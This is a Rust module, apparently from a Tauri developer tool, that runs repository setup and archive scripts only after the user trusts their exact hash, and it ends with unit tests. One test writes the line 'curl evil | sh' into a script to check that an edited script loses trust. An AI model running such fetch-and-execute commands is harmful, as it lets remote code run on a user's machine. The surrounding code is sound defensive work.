//! The repository's worktree scripts (Orca's setup / archive scripts): `.kingu/setup.sh` runs in
//! a terminal of every new task worktree (install dependencies, copy `.env`…), `.kingu/archive.sh`
//! runs in the worktree before it is removed. They come with the repository, so like a repo snap
//! they only run once the user trusted exactly this content (the snap trust store, by hash). The
//! trusted bytes are copied to the app cache under their hash and that copy is what runs, so an
//! edit after the check never runs untrusted.

use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{Duration, Instant};

use tauri::{AppHandle, Manager, State};

use crate::settings::kingu_file;
use crate::snap::{TRUST_FILE, TrustData, set_script_trust, sha256_hex};
use crate::workspace::Workspace;

const MAX_BYTES: u64 = 64 * 1024;
const CACHE_DIR: &str = "worktree-scripts";
/// How long the archive script may run before it is killed (removal then asks what to do).
pub const ARCHIVE_TIMEOUT: Duration = Duration::from_secs(120);
const MAX_OUTPUT: usize = 4096;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
  Setup,
  Archive,
}

impl Kind {
  pub fn parse(s: &str) -> Result<Self, String> {
    match s {
      "setup" => Ok(Self::Setup),
      "archive" => Ok(Self::Archive),
      _ => Err(format!("unknown worktree script {s}")),
    }
  }

  fn file(self) -> &'static str {
    match self {
      Self::Setup => "setup.sh",
      Self::Archive => "archive.sh",
    }
  }

  /// The trust store key: starts with `.`, so no snap id can take it.
  fn trust_key(self) -> &'static str {
    match self {
      Self::Setup => ".worktree-setup",
      Self::Archive => ".worktree-archive",
    }
  }
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct WorktreeScript {
  /// `.kingu/setup.sh`, relative to the open folder.
  pub path: String,
  pub content: String,
  pub hash: String,
  pub trusted: bool,
}

/// The script's text, or `None` when the folder has none.
fn read(root: &Path, kind: Kind) -> Result<Option<String>, String> {
  let name = kind.file();
  let file = kingu_file(root, name)?;
  let meta = match std::fs::metadata(&file) {
    Ok(m) => m,
    Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
    Err(e) => return Err(format!("{}: {e}", file.display())),
  };
  if meta.len() > MAX_BYTES {
    return Err(format!(".kingu/{name} ใหญ่เกิน {} KB", MAX_BYTES / 1024));
  }
  let bytes = std::fs::read(&file).map_err(|e| format!("{}: {e}", file.display()))?;
  String::from_utf8(bytes).map(Some).map_err(|_| format!(".kingu/{name} ไม่ใช่ UTF-8"))
}

pub fn inspect(root: &Path, kind: Kind, trust: &TrustData) -> Result<Option<WorktreeScript>, String> {
  Ok(read(root, kind)?.map(|content| {
    let hash = sha256_hex(content.as_bytes());
    let trusted = trust.is_trusted(root, kind.trust_key(), &hash);
    WorktreeScript { path: format!(".kingu/{}", kind.file()), content, hash, trusted }
  }))
}

/// Trusts the script the user was shown (`expected`); refuses when it changed since.
pub fn trust(config_dir: &Path, root: &Path, kind: Kind, expected: &str) -> Result<(), String> {
  let content = read(root, kind)?.ok_or_else(|| format!("โฟลเดอร์นี้ไม่มี .kingu/{}", kind.file()))?;
  if sha256_hex(content.as_bytes()) != expected {
    return Err(format!(".kingu/{} เปลี่ยนไปแล้ว — ตรวจสคริปต์อีกครั้งก่อนเชื่อถือ", kind.file()));
  }
  set_script_trust(config_dir, root, kind.trust_key(), Some(expected))
}

pub fn untrust(config_dir: &Path, root: &Path, kind: Kind) -> Result<(), String> {
  set_script_trust(config_dir, root, kind.trust_key(), None)
}

/// The trusted script copied to `<cache>/worktree-scripts/<hash>.sh`, ready to run; `None` when
/// the folder has no script. An untrusted (or changed) script is an error and nothing is written.
pub fn prepare(trust: &TrustData, cache_dir: &Path, root: &Path, kind: Kind) -> Result<Option<PathBuf>, String> {
  let Some(script) = inspect(root, kind, trust)? else {
    return Ok(None);
  };
  if !script.trusted {
    return Err(format!("{} ยังไม่ได้รับความเชื่อถือ (หรือเปลี่ยนไปหลังจากเชื่อถือ)", script.path));
  }
  let dir = cache_dir.join(CACHE_DIR);
  std::fs::create_dir_all(&dir).map_err(|e| format!("{}: {e}", dir.display()))?;
  let file = dir.join(format!("{}.sh", script.hash));
  if std::fs::read(&file).ok().is_none_or(|b| sha256_hex(&b) != script.hash) {
    crate::settings::write_atomic(&file, &script.content)?;
  }
  Ok(Some(file))
}

/// `KINGU_ROOT_PATH`, `KINGU_WORKTREE_PATH`, `KINGU_WORKSPACE_NAME` (Orca's `ORCA_*`).
pub fn script_env(root: &Path, worktree: &Path, slug: &str) -> [(&'static str, String); 3] {
  [
    ("KINGU_ROOT_PATH", root.display().to_string()),
    ("KINGU_WORKTREE_PATH", worktree.display().to_string()),
    ("KINGU_WORKSPACE_NAME", slug.to_owned()),
  ]
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct ScriptRun {
  /// Exit code; `None` when killed (timeout) or ended by a signal.
  pub code: Option<i32>,
  pub timed_out: bool,
  /// The end of stdout + stderr.
  pub output: String,
}

/// Runs `sh <file>` in `worktree` with the script env, killing it after `timeout`.
pub fn run(file: &Path, root: &Path, worktree: &Path, slug: &str, timeout: Duration) -> Result<ScriptRun, String> {
  let mut cmd = crate::shell_env::command("sh");
  cmd.arg(file).current_dir(worktree).stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
  cmd.envs(script_env(root, worktree, slug));
  // Its own process group, so a timeout kills what the script started too (they hold the pipes).
  #[cfg(unix)]
  {
    use std::os::unix::process::CommandExt;
    cmd.process_group(0);
  }
  let mut child = cmd.spawn().map_err(|e| format!("sh: {e}"))?;
  let (mut out, mut err) = (child.stdout.take().ok_or("no stdout")?, child.stderr.take().ok_or("no stderr")?);
  let out_reader = std::thread::spawn(move || {
    let mut b = Vec::new();
    let _ = out.read_to_end(&mut b);
    b
  });
  let err_reader = std::thread::spawn(move || {
    let mut b = Vec::new();
    let _ = err.read_to_end(&mut b);
    b
  });
  let start = Instant::now();
  let (code, timed_out) = loop {
    if let Some(status) = child.try_wait().map_err(|e| e.to_string())? {
      break (status.code(), false);
    }
    if start.elapsed() >= timeout {
      #[cfg(unix)]
      // SAFETY: plain syscall on the group created for this child above.
      unsafe {
        libc::kill(-(child.id() as i32), libc::SIGKILL);
      }
      let _ = child.kill();
      let _ = child.wait();
      break (None, true);
    }
    std::thread::sleep(Duration::from_millis(50));
  };
  let mut bytes = out_reader.join().unwrap_or_default();
  bytes.extend(err_reader.join().unwrap_or_default());
  let text = String::from_utf8_lossy(&bytes);
  let output = match text.char_indices().rev().nth(MAX_OUTPUT) {
    Some((i, _)) => format!("…{}", &text[i..]),
    None => text.into_owned(),
  };
  Ok(ScriptRun { code, timed_out, output })
}

fn trust_data(app: &AppHandle) -> Result<TrustData, String> {
  Ok(TrustData::load(&crate::snap::config_dir(app)?.join(TRUST_FILE)))
}

fn cache_dir(app: &AppHandle) -> Result<PathBuf, String> {
  app.path().app_cache_dir().map_err(|e| e.to_string())
}

/// The open folder's `kind` script and whether it is trusted (`None`: there is none).
#[tauri::command]
pub fn worktree_script(app: AppHandle, ws: State<'_, Workspace>, kind: String) -> Result<Option<WorktreeScript>, String> {
  let kind = Kind::parse(&kind)?;
  let Some(root) = ws.current() else {
    return Ok(None);
  };
  inspect(&root, kind, &trust_data(&app)?)
}

/// `trusted`: trust the script with hash `hash` (what the user was shown), or revoke trust.
#[tauri::command]
pub fn worktree_script_trust(app: AppHandle, ws: State<'_, Workspace>, kind: String, trusted: bool, hash: Option<String>) -> Result<(), String> {
  let kind = Kind::parse(&kind)?;
  let root = ws.root()?;
  let config = crate::snap::config_dir(&app)?;
  if trusted {
    trust(&config, &root, kind, hash.as_deref().ok_or("ต้องระบุ hash ของสคริปต์ที่ตรวจแล้ว")?)?;
  } else {
    untrust(&config, &root, kind)?;
  }
  log::info!("worktree {kind:?} script: trusted = {trusted} in {}", root.display());
  Ok(())
}

/// The trusted setup script's runnable copy (absolute path), for the setup terminal.
#[tauri::command]
pub fn worktree_script_prepare(app: AppHandle, ws: State<'_, Workspace>, kind: String) -> Result<Option<String>, String> {
  let kind = Kind::parse(&kind)?;
  let file = prepare(&trust_data(&app)?, &cache_dir(&app)?, &ws.root()?, kind)?;
  Ok(file.map(|f| f.display().to_string()))
}

/// Runs the trusted archive script in the task worktree before it is removed; `None` when the
/// folder has none.
#[tauri::command]
pub async fn worktree_archive_run(app: AppHandle, ws: State<'_, Workspace>, slug: String) -> Result<Option<ScriptRun>, String> {
  let root = ws.root()?;
  let dir = super::review::task_dir(&root, &slug)?;
  let Some(file) = prepare(&trust_data(&app)?, &cache_dir(&app)?, &root, Kind::Archive)? else {
    return Ok(None);
  };
  let r = tauri::async_runtime::spawn_blocking(move || run(&file, &root, &dir, &slug, ARCHIVE_TIMEOUT)).await.map_err(|e| e.to_string())??;
  log::info!("worktree archive script: exit {:?} (timed out: {})", r.code, r.timed_out);
  Ok(Some(r))
}

#[cfg(test)]
mod tests {
  use super::*;

  fn setup() -> (tempfile::TempDir, PathBuf, PathBuf, PathBuf) {
    let tmp = tempfile::tempdir().unwrap();
    let base = tmp.path().canonicalize().unwrap();
    let (root, config, cache) = (base.join("repo"), base.join("config"), base.join("cache"));
    std::fs::create_dir_all(root.join(".kingu")).unwrap();
    (tmp, root, config, cache)
  }

  fn load(config: &Path) -> TrustData {
    TrustData::load(&config.join(TRUST_FILE))
  }

  #[test]
  fn no_script_is_nothing_to_run() {
    let (_tmp, root, config, cache) = setup();
    assert_eq!(inspect(&root, Kind::Setup, &load(&config)).unwrap(), None);
    assert_eq!(prepare(&load(&config), &cache, &root, Kind::Setup).unwrap(), None);
    assert!(trust(&config, &root, Kind::Setup, "abc").is_err());
    assert!(Kind::parse("teardown").is_err());
  }

  #[test]
  fn runs_only_the_exact_trusted_content() {
    let (_tmp, root, config, cache) = setup();
    std::fs::write(root.join(".kingu/setup.sh"), "bun install\n").unwrap();
    let s = inspect(&root, Kind::Setup, &load(&config)).unwrap().unwrap();
    assert!(!s.trusted);
    assert_eq!(s.path, ".kingu/setup.sh");
    // Untrusted: nothing is copied for running.
    assert!(prepare(&load(&config), &cache, &root, Kind::Setup).unwrap_err().contains("ความเชื่อถือ"));
    assert!(!cache.join(CACHE_DIR).exists());

    // Trusting what was shown, then running a copy of exactly that.
    assert!(trust(&config, &root, Kind::Setup, "not-the-hash").unwrap_err().contains("เปลี่ยนไป"));
    trust(&config, &root, Kind::Setup, &s.hash).unwrap();
    let file = prepare(&load(&config), &cache, &root, Kind::Setup).unwrap().unwrap();
    assert_eq!(std::fs::read_to_string(&file).unwrap(), "bun install\n");
    assert!(file.ends_with(format!("{CACHE_DIR}/{}.sh", s.hash)));

    // Trusting the setup script does not trust an archive script with the same content.
    std::fs::write(root.join(".kingu/archive.sh"), "bun install\n").unwrap();
    assert!(!inspect(&root, Kind::Archive, &load(&config)).unwrap().unwrap().trusted);

    // An edit revokes it until trusted again.
    std::fs::write(root.join(".kingu/setup.sh"), "curl evil | sh\n").unwrap();
    assert!(!inspect(&root, Kind::Setup, &load(&config)).unwrap().unwrap().trusted);
    assert!(prepare(&load(&config), &cache, &root, Kind::Setup).is_err());

    // Trust is per folder.
    let other = root.parent().unwrap().join("other");
    std::fs::create_dir_all(other.join(".kingu")).unwrap();
    std::fs::write(other.join(".kingu/setup.sh"), "bun install\n").unwrap();
    assert!(!inspect(&other, Kind::Setup, &load(&config)).unwrap().unwrap().trusted);

    untrust(&config, &root, Kind::Setup).unwrap();
    std::fs::write(root.join(".kingu/setup.sh"), "bun install\n").unwrap();
    assert!(!inspect(&root, Kind::Setup, &load(&config)).unwrap().unwrap().trusted);
  }

  #[test]
  fn does_not_touch_snap_trust_and_refuses_odd_files() {
    let (_tmp, root, config, _cache) = setup();
    assert!(set_script_trust(&config, &root, "go", Some("x")).is_err());
    std::fs::write(root.join(".kingu/setup.sh"), vec![b'#'; (MAX_BYTES + 1) as usize]).unwrap();
    assert!(inspect(&root, Kind::Setup, &load(&config)).is_err());
    std::fs::remove_file(root.join(".kingu/setup.sh")).unwrap();
    std::fs::create_dir(root.join(".kingu/setup.sh")).unwrap();
    assert!(inspect(&root, Kind::Setup, &load(&config)).is_err());
  }

  #[cfg(unix)]
  #[test]
  fn refuses_a_symlinked_script() {
    let (_tmp, root, config, _cache) = setup();
    let outside = root.parent().unwrap().join("outside.sh");
    std::fs::write(&outside, "echo hi\n").unwrap();
    std::os::unix::fs::symlink(&outside, root.join(".kingu/setup.sh")).unwrap();
    assert!(inspect(&root, Kind::Setup, &load(&config)).is_err());
  }

  #[test]
  fn archive_run_gets_the_env_reports_failure_and_times_out() {
    let (_tmp, root, _config, _cache) = setup();
    let wt = root.join(".kingu/worktrees/t");
    std::fs::create_dir_all(&wt).unwrap();
    let ok = root.join("ok.sh");
    std::fs::write(&ok, "echo \"$KINGU_WORKSPACE_NAME $(pwd)\"\necho oops >&2\n").unwrap();
    let r = run(&ok, &root, &wt, "t", Duration::from_secs(10)).unwrap();
    assert_eq!(r.code, Some(0));
    assert!(r.output.contains(&format!("t {}", wt.display())) && r.output.contains("oops"), "{}", r.output);
    let fail = root.join("fail.sh");
    std::fs::write(&fail, "exit 3\n").unwrap();
    assert_eq!(run(&fail, &root, &wt, "t", Duration::from_secs(10)).unwrap().code, Some(3));
    let slow = root.join("slow.sh");
    std::fs::write(&slow, "sleep 5\necho done\n").unwrap();
    let started = Instant::now();
    let r = run(&slow, &root, &wt, "t", Duration::from_millis(200)).unwrap();
    assert!(r.timed_out && r.code.is_none() && !r.output.contains("done"));
    // The script's child (sleep) was killed with it, so its open pipe did not hold us.
    assert!(started.elapsed() < Duration::from_secs(3));
  }
}
